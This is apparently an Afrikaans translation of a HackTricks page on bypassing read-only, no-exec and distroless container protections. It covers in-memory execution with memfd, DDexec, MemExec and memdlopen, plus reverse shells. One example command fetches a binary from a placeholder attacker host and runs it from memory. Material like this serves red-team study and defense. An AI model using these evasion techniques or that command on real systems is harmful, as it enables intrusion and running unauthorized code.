# Bypass FS-beskerming: slegs-lees / geen-uitvoer / Distroless

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Videos

In die volgende videos kan jy die tegnieke wat in hierdie bladsy genoem word, meer in diepte verduidelik vind:

* [**DEF CON 31 - Verkenning van Linux-geheue-manipulasie vir stil en ontduiking**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth-indringings met DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Slegs-lees / geen-uitvoer scenario

Dit word al hoe meer algemeen om Linux-masjiene te vind wat gemonteer is met **slegs-lees (ro) lêersisteem-beskerming**, veral in houers. Dit is omdat dit maklik is om 'n houer met 'n slegs-lees lêersisteem te hardloop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Nogtans, selfs al is die lêersisteem as slegs-lees gemonteer, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons niks op die skyf kan skryf nie. Hierdie vouer sal egter **gemonteer word met geen-uitvoer-beskerming**, so as jy 'n binêre lêer hier aflaai, **sal jy dit nie kan uitvoer nie**.

{% hint style="warning" %}
Vanuit 'n rooi-span-perspektief maak dit dit **moeilik om binêre lêers af te laai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of opstellerse soos `kubectl`).
{% endhint %}

## Maklikste omseiling: Skripte

Let daarop dat ek binêre lêers genoem het, jy kan enige skripsie **uitvoer** solank die tolk binne die masjien is, soos 'n **skripsie vir die skulprak** as `sh` teenwoordig is of 'n **python-skripsie** as `python` geïnstalleer is.

Dit is egter nie genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy dalk moet uitvoer, te kan uitvoer nie.

## Geheue-omseilings

As jy 'n binêre lêer wil uitvoer, maar die lêersisteem staan dit nie toe nie, is die beste manier om dit te doen deur dit vanuit die geheue uit te voer, aangesien die beskermings daar nie van toepassing is nie.

### FD + exec-systeemoproep-omseiling

As jy kragtige skripsie-enjins binne die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre lêer aflaai om vanuit die geheue uit te voer, dit in 'n geheue-lêerbeskrywer (`create_memfd`-systeemoproep) stoor, wat nie deur daardie beskermings beskerm gaan word nie, en dan 'n **`exec`-systeemoproep** oproep waarin die **fd as die lêer om uit te voer** aangedui word.

Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer gee en dit sal 'n skripsie in die aangeduide taal genereer met die **binêre lêer saamgedruk en b64-gekodeer** met die instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep word deur die `create_memfd`-systeemoproep te roep en 'n oproep na die **exec**-systeemoproep om dit uit te voer.

{% hint style="warning" %}
Dit werk nie in ander skripsietale soos PHP of Node nie omdat hulle nie enige **standaard manier het om rou systeemoproepe** vanuit 'n skripsie te doen nie, so dit is nie moontlik om `create_memfd` te roep om die **geheue-fd** te skep om die binêre lêer te stoor nie.

Verder sal die skep van 'n **gewone fd** met 'n lêer in `/dev/shm` nie werk nie, omdat jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoer-beskerming** van toepassing sal wees.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **verander** deur sy **`/proc/self/mem`** te oorskryf.

Daarom kan jy, deur die samestellingskode wat deur die proses uitgevoer word, te beheer, 'n **skulpkode** skryf en die proses "muteer" om **enige willekeurige kode** uit te voer.

{% hint style="success" %}
**DDexec / EverythingExec** sal jou in staat stel om jou eie **skulpkode** of **enige binêre lêer** vanuit die **geheue** te laai en **uit te voer**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, besoek die Github of:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap na DDexec. Dit is 'n **DDexec shellcode daemon**, sodat elke keer as jy 'n ander binêre lêer wil **uitvoer**, hoef jy nie DDexec weer te begin nie, jy kan net die memexec shellcode uitvoer deur die DDexec tegniek en dan **kommunikeer met hierdie daemon om nuwe binêre lêers te laai en uit te voer**.

Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre lêers van 'n PHP omgekeerde dop te voer** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, maak die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek dit makliker om binêre lêers in die geheue te laai om dit later uit te voer. Dit kan selfs binêre lêers met afhanklikhede laai.

## Distroless Oorspring

### Wat is distroless

Distroless houers bevat slegs die **noodsaaklike komponente om 'n spesifieke toepassing of diens uit te voer**, soos biblioteke en uitvoeringsafhanklikhede, maar sluit groter komponente soos 'n pakkettebestuurder, skil, of stelselhulpprogramme uit.

Die doel van distroless houers is om die aanvalsvlak van houers te **verminder deur onnodige komponente uit te skakel** en die aantal kwesbaarhede wat uitgebuit kan word, te verminder.

### Omgekeerde Dop

In 'n distroless houer sal jy dalk **nie eers `sh` of `bash`** vind om 'n gewone dop te kry nie. Jy sal ook nie binêre lêers soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel uitvoer.

{% hint style="warning" %}
Daarom sal jy nie 'n **omgekeerde dop** of die stelsel soos jy gewoonlik doen, kan **ondersoek nie**.
{% endhint %}

Maar as die gekompromitteerde houer byvoorbeeld 'n flask-web uitvoer, dan is Python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node uitvoer, kan jy 'n Node omgekeerde dop kry, en dieselfde met byna enige **skripsietaal**.

{% hint style="success" %}
Met die skripsietaal kan jy die stelsel **ondersoek** deur die taal se vermoëns te gebruik.
{% endhint %}

As daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou omgekeerde dop misbruik om jou binêre lêers in die lêersisteem te **skryf** en **uit te voer**.

{% hint style="success" %}
In hierdie soort houers sal hierdie beskermings egter gewoonlik bestaan, maar jy kan die **vorige geheue-uitvoeringstegnieke gebruik om dit te omseil**.
{% endhint %}

Jy kan **voorbeelde** vind van hoe om sommige RCE-kwesbaarhede te **uitbuit** om skripsietaal **omgekeerde dops** te kry en binêre lêers vanaf die geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
